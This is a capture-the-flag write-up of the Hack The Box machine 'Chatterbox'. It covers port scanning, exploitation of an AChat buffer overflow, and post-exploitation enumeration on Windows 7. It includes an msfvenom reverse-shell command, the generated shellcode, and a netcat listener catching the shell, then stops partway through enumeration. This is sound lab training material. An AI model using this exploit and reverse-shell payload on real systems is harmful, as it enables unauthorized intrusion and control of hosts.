# [chatterbox](https://app.hackthebox.com/machines/123)

> A Windows machine running with tight firewall rules, only allowing external connections to an [AChat](https://sourceforge.net/projects/achat/) instance. This version of AChat is vulnerable to remote code execution, granting a low-privileged shell. The low-privileged user's plaintext password is stored in the registry via an AutoLogon configuration and this password. By establishing a reverse port forward tunnel to the target's `localhost`:`445`, it is possible to confirm this password is reused as `Administrator`'s and use it to gain an elevated shell. Interestingly, the low-privileged user owns the system flag file and is the only one allowed to read it. From the elevated shell, it is possible to take ownership of the flag file, add an ACE that allows `NT AUTHORITY\SYSTEM` to read it, and do so.

---

## Open Port Enumeration

The target is only serving two unusual ports: TCP 9255 and TCP 9256.

```bash
$ sudo masscan -p1-65535 10.129.254.227 --rate=1000 -e tun0 --output-format grepable --output-filename enum/chatterbox.masscan
$ cat enum/chatterbox.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
9255,9256, 
```

`nmap` identifies these ports as belonging to [AChat](https://sourceforge.net/projects/achat/), a piece of chatting and file sharing software whose last update was in 2007. The target's operating system appears to be a version of Windows that is at least older than Windows 10.

```bash
$ sudo nmap -sC -sV -O -p9255,9256 10.129.254.227 -oA enum/chatterbox
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-04 14:18 UTC
Nmap scan report for 10.129.254.227
Host is up (0.018s latency).

PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp open  achat   AChat chat system
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.57 seconds
```

---

## Exploiting AChat

AChat 0.150 Beta 7 has a buffer overflow vulnerability with several available exploits. Use [this Python one from ExploitDB](https://www.exploit-db.com/exploits/36025).

Generate a reverse shell payload and replace it with the current one in the exploit.

```bash
$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.139 LPORT=443 EXITFUNC=thread -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)
x86/unicode_mixed chosen with final size 774
Payload size: 774 bytes
Final size of python file: 3767 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x49\x6c\x49\x58\x43\x52"
buf += b"\x4b\x50\x49\x70\x6d\x30\x61\x50\x64\x49\x67\x75\x6e"
buf += b"\x51\x57\x50\x71\x54\x74\x4b\x72\x30\x70\x30\x62\x6b"
buf += b"\x72\x32\x6a\x6c\x44\x4b\x62\x32\x7a\x74\x52\x6b\x53"
buf += b"\x42\x6d\x58\x7a\x6f\x35\x67\x6d\x7a\x4b\x76\x50\x31"
buf += b"\x6b\x4f\x46\x4c\x6d\x6c\x73\x31\x53\x4c\x39\x72\x6c"
buf += b"\x6c\x4f\x30\x67\x51\x76\x6f\x6c\x4d\x7a\x61\x58\x47"
buf += b"\x48\x62\x69\x62\x70\x52\x30\x57\x44\x4b\x61\x42\x4c"
buf += b"\x50\x74\x4b\x6d\x7a\x6f\x4c\x64\x4b\x70\x4c\x6b\x61"
buf += b"\x34\x38\x67\x73\x6f\x58\x59\x71\x76\x71\x70\x51\x54"
buf += b"\x4b\x6e\x79\x6d\x50\x6b\x51\x46\x73\x54\x4b\x31\x39"
buf += b"\x6b\x68\x37\x73\x6e\x5a\x31\x39\x42\x6b\x6d\x64\x62"
buf += b"\x6b\x79\x71\x67\x66\x70\x31\x59\x6f\x56\x4c\x66\x61"
buf += b"\x76\x6f\x7a\x6d\x59\x71\x75\x77\x70\x38\x6b\x30\x62"
buf += b"\x55\x4c\x36\x4a\x63\x63\x4d\x58\x78\x4d\x6b\x33\x4d"
buf += b"\x4e\x44\x72\x55\x6a\x44\x31\x48\x54\x4b\x4e\x78\x6d"
buf += b"\x54\x39\x71\x77\x63\x43\x36\x52\x6b\x6a\x6c\x30\x4b"
buf += b"\x62\x6b\x32\x38\x6b\x6c\x4a\x61\x37\x63\x62\x6b\x6c"
buf += b"\x44\x52\x6b\x6d\x31\x36\x70\x45\x39\x6d\x74\x4c\x64"
buf += b"\x4d\x54\x51\x4b\x31\x4b\x73\x31\x50\x59\x6f\x6a\x42"
buf += b"\x31\x39\x6f\x39\x50\x6f\x6f\x71\x4f\x70\x5a\x62\x6b"
buf += b"\x4e\x32\x38\x6b\x64\x4d\x71\x4d\x4f\x78\x70\x33\x4d"
buf += b"\x62\x39\x70\x49\x70\x31\x58\x74\x37\x74\x33\x6c\x72"
buf += b"\x71\x4f\x4e\x74\x50\x68\x6e\x6c\x50\x77\x6b\x76\x69"
buf += b"\x77\x4b\x4f\x7a\x35\x58\x38\x72\x70\x6b\x51\x69\x70"
buf += b"\x59\x70\x6c\x69\x78\x44\x62\x34\x62\x30\x61\x58\x4b"
buf += b"\x79\x73\x50\x32\x4b\x59\x70\x79\x6f\x7a\x35\x50\x50"
buf += b"\x50\x50\x52\x30\x52\x30\x31\x30\x72\x30\x31\x30\x4e"
buf += b"\x70\x72\x48\x58\x6a\x4c\x4f\x77\x6f\x67\x70\x49\x6f"
buf += b"\x4a\x35\x62\x77\x42\x4a\x6c\x45\x71\x58\x6a\x6a\x7a"
buf += b"\x6a\x4c\x4e\x44\x4b\x32\x48\x39\x72\x6d\x30\x5a\x61"
buf += b"\x65\x6b\x71\x79\x5a\x46\x32\x4a\x6a\x70\x50\x56\x42"
buf += b"\x37\x51\x58\x35\x49\x36\x45\x34\x34\x51\x51\x59\x6f"
buf += b"\x76\x75\x33\x55\x67\x50\x42\x54\x7a\x6c\x39\x6f\x70"
buf += b"\x4e\x39\x78\x51\x65\x38\x6c\x50\x68\x6c\x30\x46\x55"
buf += b"\x57\x32\x70\x56\x6b\x4f\x4a\x35\x31\x58\x30\x63\x52"
buf += b"\x4d\x32\x44\x69\x70\x31\x79\x47\x73\x42\x37\x30\x57"
buf += b"\x6e\x77\x6c\x71\x6a\x56\x30\x6a\x6d\x42\x4e\x79\x62"
buf += b"\x36\x4a\x42\x6b\x4d\x4f\x76\x47\x57\x4d\x74\x6c\x64"
buf += b"\x6d\x6c\x4d\x31\x4d\x31\x54\x4d\x61\x34\x6c\x64\x5a"
buf += b"\x70\x56\x66\x49\x70\x6d\x74\x62\x34\x4e\x70\x72\x36"
buf += b"\x50\x56\x62\x36\x4f\x56\x4f\x66\x50\x4e\x71\x46\x51"
buf += b"\x46\x42\x33\x71\x46\x72\x48\x34\x39\x38\x4c\x6d\x6f"
buf += b"\x62\x66\x59\x6f\x58\x55\x31\x79\x47\x70\x30\x4e\x51"
buf += b"\x46\x4f\x56\x4b\x4f\x50\x30\x62\x48\x6a\x68\x52\x67"
buf += b"\x4d\x4d\x71\x50\x59\x6f\x76\x75\x37\x4b\x37\x70\x4b"
buf += b"\x6d\x6c\x6a\x6a\x6a\x43\x38\x64\x66\x64\x55\x75\x6d"
buf += b"\x33\x6d\x79\x6f\x66\x75\x4d\x6c\x4c\x46\x31\x6c\x6c"
buf += b"\x4a\x43\x50\x69\x6b\x49\x50\x52\x55\x6d\x35\x35\x6b"
buf += b"\x51\x37\x5a\x73\x30\x72\x52\x4f\x51\x5a\x6d\x30\x6f"
buf += b"\x63\x69\x6f\x46\x75\x41\x41"
```

Change the target IP address.

```python
...[SNIP]...

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.129.254.227', 9256)

...[SNIP]...
```

Start a reverse shell listener.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

Launch the exploit and receive the reverse shell as the local user `alfred`. Grab the user flag from `C:\Users\alfred\Desktop\user.txt`.

```bash
$ python2.7 36025.py
---->{P00F}!
```

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.139] from (UNKNOWN) [10.129.254.227] 49157
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred
```

---

## Situational Awareness as `alfred`

### System Information

The target's operating system is Windows 7 version 6.1.7601 Service Pack 1 Build 7601. Its CPU architecture is x86. Its locale is in the United States and its in the Eastern timezone. It is not joined to a domain. It has *several* updates installed.

```batch
C:\Windows\system32>systeminfo
systeminfo

Host Name:                 CHATTERBOX
OS Name:                   Microsoft Windows 7 Professional
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00371-222-9819843-86663
Original Install Date:     12/10/2017, 9:18:19 AM
System Boot Time:          2/4/2022, 9:13:11 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
                           [02]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,427 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,407 MB
Virtual Memory: In Use:    688 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\CHATTERBOX
Hotfix(s):                 183 Hotfix(s) Installed.
                           [01]: KB2849697
                           [02]: KB2849696
                           [03]: KB2841134
                           [04]: KB2670838
                           [05]: KB2830477
                           [06]: KB2592687
                           [07]: KB2479943
                           [08]: KB2491683
                           [09]: KB2506212
                           [10]: KB2506928
                           [11]: KB2509553
                           [12]: KB2533552
                           [13]: KB2534111
                           [14]: KB2545698
                           [15]: KB2547666
                           [16]: KB2552343
                           [17]: KB2560656
                           [18]: KB2563227
                           [19]: KB2564958
                           [20]: KB2574819
                           [21]: KB2579686
                           [22]: KB2604115
                           [23]: KB2620704
                           [24]: KB2621440
                           [25]: KB2631813
                           [26]: KB2639308
                           [27]: KB2640148
                           [28]: KB2647753
                           [29]: KB2654428
                           [30]: KB2660075
                           [31]: KB2667402
                           [32]: KB2676562
                           [33]: KB2685811
                           [34]: KB2685813
                           [35]: KB2690533
                           [36]: KB2698365
                           [37]: KB2705219
                           [38]: KB2719857
                           [39]: KB2726535
                           [40]: KB2727528
                           [41]: KB2729094
                           [42]: KB2732059
                           [43]: KB2732487
                           [44]: KB2736422
                           [45]: KB2742599
                           [46]: KB2750841
                           [47]: KB2761217
                           [48]: KB2763523
                           [49]: KB2770660
                           [50]: KB2773072
                           [51]: KB2786081
                           [52]: KB2799926
                           [53]: KB2800095
                           [54]: KB2807986
                           [55]: KB2808679
                           [56]: KB2813430
                           [57]: KB2820331
                           [58]: KB2834140
                           [59]: KB2840631
                           [60]: KB2843630
                           [61]: KB2847927
                           [62]: KB2852386
                           [63]: KB2853952
                           [64]: KB2857650
                           [65]: KB2861698
                           [66]: KB2862152
                           [67]: KB2862330
                           [68]: KB2862335
                           [69]: KB2864202
                           [70]: KB2868038
                           [71]: KB2871997
                           [72]: KB2884256
                           [73]: KB2891804
                           [74]: KB2892074
                           [75]: KB2893294
                           [76]: KB2893519
                           [77]: KB2894844
                           [78]: KB2900986
                           [79]: KB2908783
                           [80]: KB2911501
                           [81]: KB2912390
                           [82]: KB2918077
                           [83]: KB2919469
                           [84]: KB2923545
                           [85]: KB2931356
                           [86]: KB2937610
                           [87]: KB2943357
                           [88]: KB2952664
                           [89]: KB2966583
                           [90]: KB2968294
                           [91]: KB2970228
                           [92]: KB2972100
                           [93]: KB2973112
                           [94]: KB2973201
                           [95]: KB2973351
                           [96]: KB2977292
                           [97]: KB2978742
                           [98]: KB2984972
                           [99]: KB2985461
                           [100]: KB2991963
                           [101]: KB2992611
                           [102]: KB3003743
                           [103]: KB3004361
                           [104]: KB3004375
                           [105]: KB3006121
                           [106]: KB3006137
                           [107]: KB3010788
                           [108]: KB3011780
                           [109]: KB3013531
                           [110]: KB3020370
                           [111]: KB3020388
                           [112]: KB3021674
                           [113]: KB3021917
                           [114]: KB3022777
                           [115]: KB3023215
                           [116]: KB3030377
                           [117]: KB3035126
                           [118]: KB3037574
                           [119]: KB3042058
                           [120]: KB3045685
                           [121]: KB3046017
                           [122]: KB3046269
                           [123]: KB3054476
                           [124]: KB3055642
                           [125]: KB3059317
                           [126]: KB3060716
                           [127]: KB3061518
                           [128]: KB3067903
                           [129]: KB3068708
                           [130]: KB3071756
                           [131]: KB3072305
                           [132]: KB3074543
                           [133]: KB3075226
                           [134]: KB3078601
                           [135]: KB3078667
                           [136]: KB3080149
                           [137]: KB3084135
                           [138]: KB3086255
                           [139]: KB3092627
                           [140]: KB3093513
                           [141]: KB3097989
                           [142]: KB3101722
                           [143]: KB3102429
                           [144]: KB3107998
                           [145]: KB3108371
                           [146]: KB3108381
                           [147]: KB3108664
                           [148]: KB3109103
                           [149]: KB3109560
                           [150]: KB3110329
                           [151]: KB3118401
                           [152]: KB3122648
                           [153]: KB3123479
                           [154]: KB3126587
                           [155]: KB3127220
                           [156]: KB3133977
                           [157]: KB3137061
                           [158]: KB3138378
                           [159]: KB3138612
                           [160]: KB3138910
                           [161]: KB3139398
                           [162]: KB3139914
                           [163]: KB3140245
                           [164]: KB3147071
                           [165]: KB3150220
                           [166]: KB3150513
                           [167]: KB3156016
                           [168]: KB3156019
                           [169]: KB3159398
                           [170]: KB3161102
                           [171]: KB3161949
                           [172]: KB3161958
                           [173]: KB3172605
                           [174]: KB3177467
                           [175]: KB3179573
                           [176]: KB3184143
                           [177]: KB3185319
                           [178]: KB4014596
                           [179]: KB4019990
                           [180]: KB4040980
                           [181]: KB976902
                           [182]: KB982018
                           [183]: KB4054518
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.254.227
```

The target doesn't have any extra disks.

```batch
C:\Windows\system32>wmic logicaldisk get caption,description,providername
wmic logicaldisk get caption,description,providername
Caption  Description              ProviderName
A:       3 1/2 Inch Floppy Drive
C:       Local Fixed Disk
```

Running processes:

```batch
C:\Windows\system32>tasklist /v
tasklist /v

Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title
========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================
System Idle Process              0 Services                   0         24 K Unknown         NT AUTHORITY\SYSTEM                                     1:10:16 N/A
System                           4 Services                   0        508 K Unknown         N/A                                                     0:00:14 N/A
smss.exe                       240 Services                   0        860 K Unknown         N/A                                                     0:00:00 N/A
csrss.exe                      320 Services                   0      3,580 K Unknown         N/A                                                     0:00:07 N/A
wininit.exe                    360 Services                   0      3,368 K Unknown         N/A                                                     0:00:00 N/A
csrss.exe                      372 Console                    1      7,296 K Running         N/A                                                     0:00:01 N/A
services.exe                   416 Services                   0      7,056 K Unknown         N/A                                                     0:00:01 N/A
winlogon.exe                   448 Console                    1      5,736 K Unknown         N/A                                                     0:00:00 N/A
lsass.exe                      460 Services                   0      8,356 K Unknown         N/A                                                     0:00:01 N/A
lsm.exe                        468 Services                   0      3,048 K Unknown         N/A                                                     0:00:00 N/A
svchost.exe                    596 Services                   0      7,636 K Unknown         N/A                                                     0:00:02 N/A
vmacthlp.exe                   656 Services                   0      3,424 K Unknown         N/A                                                     0:00:00 N/A
svchost.exe                    700 Services                   0      6,276 K Unknown         N/A                                                     0:00:00 N/A
svchost.exe                    756 Services                   0     13,400 K Unknown         N/A                                                     0:00:01 N/A
svchost.exe                    844 Services                   0     53,992 K Unknown         N/A                                                     0:00:06 N/A
svchost.exe                    888 Services                   0     11,532 K Unknown         N/A                                                     0:00:02 N/A
svchost.exe                    920 Services                   0     30,852 K Unknown         N/A                                                     0:00:08 N/A
svchost.exe                   1040 Services                   0      4,320 K Unknown         N/A                                                     0:00:00 N/A
svchost.exe                   1176 Services                   0     15,404 K Unknown         N/A                                                     0:00:02 N/A
spoolsv.exe                   1288 Services                   0     13,052 K Unknown         N/A                                                     0:00:00 N/A
taskhost.exe                  1372 Console                    1     10,124 K Running         CHATTERBOX\Alfred                                       0:00:00 MCI command handling window
svchost.exe                   1424 Services                   0     10,152 K Unknown         N/A                                                     0:00:00 N/A
dwm.exe                       1476 Console                    1      4,248 K Running         CHATTERBOX\Alfred                                       0:00:00 DWM Notification Window
explorer.exe                  1500 Console                    1     33,616 K Running         CHATTERBOX\Alfred                                       0:00:04 N/A
svchost.exe                   1584 Services                   0      5,544 K Unknown         N/A                                                     0:00:00 N/A
VGAuthService.exe             1676 Services                   0      9,196 K Unknown         N/A                                                     0:00:00 N/A
taskeng.exe                   1780 Console                    1      4,436 K Running         CHATTERBOX\Alfred                                       0:00:00 TaskEng - Task Scheduler Engine Process
vmtoolsd.exe                  1800 Services                   0     16,664 K Unknown         N/A                                                     0:00:02 N/A
vmtoolsd.exe                  1868 Console                    1      9,140 K Running         CHATTERBOX\Alfred                                       0:00:01 N/A
rundll32.exe                  1244 Console                    1      8,232 K Running         CHATTERBOX\Alfred                                       0:00:02 N/A
dinotify.exe                   776 Console                    1      4,604 K Running         CHATTERBOX\Alfred                                       0:00:00 DINotifyWindowName853
msdtc.exe                     2352 Services                   0      6,452 K Unknown         N/A                                                     0:00:00 N/A
WmiPrvSE.exe                  2412 Services                   0     13,060 K Unknown         N/A                                                     0:00:07 N/A
SearchIndexer.exe             2628 Services                   0     11,556 K Unknown         N/A                                                     0:00:00 N/A
svchost.exe                   3652 Services                   0      3,896 K Unknown         N/A                                                     0:00:00 N/A
sppsvc.exe                    3672 Services                   0      6,476 K Unknown         N/A                                                     0:00:00 N/A
svchost.exe                   3844 Services                   0     25,216 K Unknown         N/A                                                     0:00:16 N/A
TrustedInstaller.exe          3056 Services                   0     11,088 K Unknown         N/A                                                     0:00:07 N/A
cmd.exe                       3508 Console                    1      1,308 K Running         CHATTERBOX\Alfred                                       0:00:00 C:\Windows\system32\cmd.exe - tasklist  /v
conhost.exe                   3220 Console                    1      3,888 K Unknown         CHATTERBOX\Alfred                                       0:00:00 N/A
AChat.exe                     2156 Console                    1     12,464 K Running         CHATTERBOX\Alfred                                       0:00:00 AChat v0.150 beta7
tasklist.exe                  1736 Console                    1      4,612 K Unknown         CHATTERBOX\Alfred                                       0:00:00 N/A
```

Running processes and their association to configured services:

```batch
C:\Windows\system32>tasklist /svc
tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
smss.exe                       240 N/A
csrss.exe                      320 N/A
wininit.exe                    360 N/A
csrss.exe                      372 N/A
services.exe                   416 N/A
winlogon.exe                   448 N/A
lsass.exe                      460 SamSs, VaultSvc
lsm.exe                        468 N/A
svchost.exe                    596 DcomLaunch, PlugPlay, Power
vmacthlp.exe                   656 VMware Physical Disk Helper Service
svchost.exe                    700 RpcEptMapper, RpcSs
svchost.exe                    756 Audiosrv, Dhcp, eventlog, lmhosts, wscsvc
svchost.exe                    844 AudioEndpointBuilder, CscService, Netman,
                                   SysMain, TrkWks, UxSms, WdiSystemHost,
                                   wudfsvc
svchost.exe                    888 EventSystem, FontCache, netprofm, nsi,
                                   sppuinotify, W32Time, WdiServiceHost
svchost.exe                    920 AeLookupSvc, BITS, IKEEXT, iphlpsvc,
                                   LanmanServer, ProfSvc, Schedule, SENS,
                                   ShellHWDetection, Themes, Winmgmt, wuauserv
svchost.exe                   1040 gpsvc
svchost.exe                   1176 CryptSvc, Dnscache, LanmanWorkstation,
                                   NlaSvc
spoolsv.exe                   1288 Spooler
taskhost.exe                  1372 N/A
svchost.exe                   1424 BFE, DPS, MpsSvc
dwm.exe                       1476 N/A
explorer.exe                  1500 N/A
svchost.exe                   1584 DiagTrack
VGAuthService.exe             1676 VGAuthService
taskeng.exe                   1780 N/A
vmtoolsd.exe                  1800 VMTools
vmtoolsd.exe                  1868 N/A
rundll32.exe                  1244 N/A
dinotify.exe                   776 N/A
msdtc.exe                     2352 MSDTC
WmiPrvSE.exe                  2412 N/A
SearchIndexer.exe             2628 WSearch
svchost.exe                   3652 SSDPSRV
sppsvc.exe                    3672 sppsvc
svchost.exe                   3844 WinDefend
TrustedInstaller.exe          3056 TrustedInstaller
cmd.exe                       3508 N/A
conhost.exe                   3220 N/A
AChat.exe                     2204 N/A
tasklist.exe                  4056 N/A
```

The target has .NET Framework version 4.0 and lower installed.

```batch
C:\Windows\system32>reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP"
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\CDF
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.0
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4.0
```

### User Enumeration

`alfred` isn't in any interesting groups and doesn't have any interesting privileges.

```batch
C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name         SID
================= =============================================
chatterbox\alfred S-1-5-21-1218242403-4263168573-589647361-1000


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192  Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

`alfred` is the only non-standard user on the machine.

```batch
C:\Windows\system32>net user
net user

User accounts for \\CHATTERBOX

-------------------------------------------------------------------------------
Administrator            Alfred                   Guest
The command completed successfully.
```

There are no non-standard groups on the machine.

```batch
C:\Windows\system32>net localgroup
net localgroup

Aliases for \\CHATTERBOX

-------------------------------------------------------------------------------
*Administrators
*Backup Operators
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Replicator
*Users
The command completed successfully.
```

### Network Enumeration

The target doesn't have any extra interfaces.

```batch
C:\Windows\system32>ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Chatterbox
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : .htb

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-FA-15
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.129.254.227(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Friday, February 04, 2022 9:13:20 AM
   Lease Expires . . . . . . . . . . : Friday, February 04, 2022 10:03:37 AM
   Default Gateway . . . . . . . . . : 10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

```batch

C:\Windows\system32>route print
route print
===========================================================================
Interface List
 11...00 50 56 b9 fa 15 ......Intel(R) PRO/1000 MT Network Connection
  1...........................Software Loopback Interface 1
 18...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       10.129.0.1   10.129.254.227     10
       10.129.0.0      255.255.0.0         On-link    10.129.254.227    266
   10.129.254.227  255.255.255.255         On-link    10.129.254.227    266
   10.129.255.255  255.255.255.255         On-link    10.129.254.227    266
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306
        224.0.0.0        240.0.0.0         On-link    10.129.254.227    266
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306
  255.255.255.255  255.255.255.255         On-link    10.129.254.227    266
===========================================================================
Persistent Routes:
  None

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    306 ::1/128                  On-link
  1    306 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None
```

```batch
C:\Windows\system32>arp -a
arp -a

Interface: 10.129.254.227 --- 0xb
  Internet Address      Physical Address      Type
  10.129.0.1            00-50-56-b9-2b-b5     dynamic
